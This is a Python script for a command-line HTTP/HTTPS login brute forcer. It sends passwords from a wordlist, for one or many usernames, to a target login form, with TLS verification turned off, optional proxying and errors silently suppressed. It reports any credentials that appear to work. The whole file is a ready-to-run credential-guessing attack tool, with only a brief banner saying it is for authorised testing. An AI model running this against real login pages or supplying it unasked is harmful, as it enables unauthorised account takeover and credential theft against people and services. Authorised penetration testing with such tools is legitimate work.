import requests
import argparse
from time import sleep
import urllib3

# Disable InsecureRequestWarning for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def brute_force(url, username, username_field, password_field, passwords, delay=1, proxy=None, success_string=None):
    proxies = {}
    if proxy:
        proxies = {'http': proxy, 'https': proxy}

    for password in passwords:
        password = password.strip()
        data = {username_field: username, password_field: password}
        
        try:
            response = requests.post(url, data=data, proxies=proxies, verify=False)
            content_length = len(response.content)

            if success_string:
                if success_string in response.text:
                    print(f"[+] Success! Credentials: {username}:{password} | Response Length: {content_length}")
                    return
            else:
                # Check for common success indicators
                if response.status_code == 302 or "logout" in response.text.lower():
                    print(f"[+] Possible success: {username}:{password} | Status Code: {response.status_code} | Response Length: {content_length}")
                    return
                
            print(f"[-] Failed: {username}:{password} | Status Code: {response.status_code} | Response Length: {content_length}")
            
        except Exception:
            # Suppress all exceptions silently
            pass
        
        sleep(delay)  # Avoid rate limiting

def main():
    parser = argparse.ArgumentParser(description="HTTP/HTTPS Brute Forcer")
    parser.add_argument("-u", "--url", required=True, help="Target login URL")
    parser.add_argument("-U", "--user", help="Single username")
    parser.add_argument("-uf", "--userfile", help="Username list file")
    parser.add_argument("-p", "--passfile", required=True, help="Password list file")
    parser.add_argument("-ufield", "--username-field", default="username", help="Username form field name")
    parser.add_argument("-pfield", "--password-field", default="password", help="Password form field name")
    parser.add_argument("-s", "--success-string", help="String indicating successful login")
    parser.add_argument("-d", "--delay", type=float, default=1, help="Delay between requests in seconds")
    parser.add_argument("-x", "--proxy", help="Proxy server (e.g., http://127.0.0.1:8080)")

    args = parser.parse_args()

    with open(args.passfile, 'r') as f:
        passwords = f.readlines()

    usernames = []
    if args.user:
        usernames = [args.user]
    elif args.userfile:
        with open(args.userfile, 'r') as f:
            usernames = [line.strip() for line in f]

    for username in usernames:
        print(f"\n[*] Trying username: {username}")
        brute_force(
            url=args.url,
            username=username,
            username_field=args.username_field,
            password_field=args.password_field,
            passwords=passwords,
            delay=args.delay,
            proxy=args.proxy,
            success_string=args.success_string
        )

if __name__ == "__main__":
    print("""
    /!\\ WARNING /!\\
    This tool should only be used on systems you own
    or have explicit permission to test. Unauthorized
    access to computer systems is illegal.
    """)
    main()
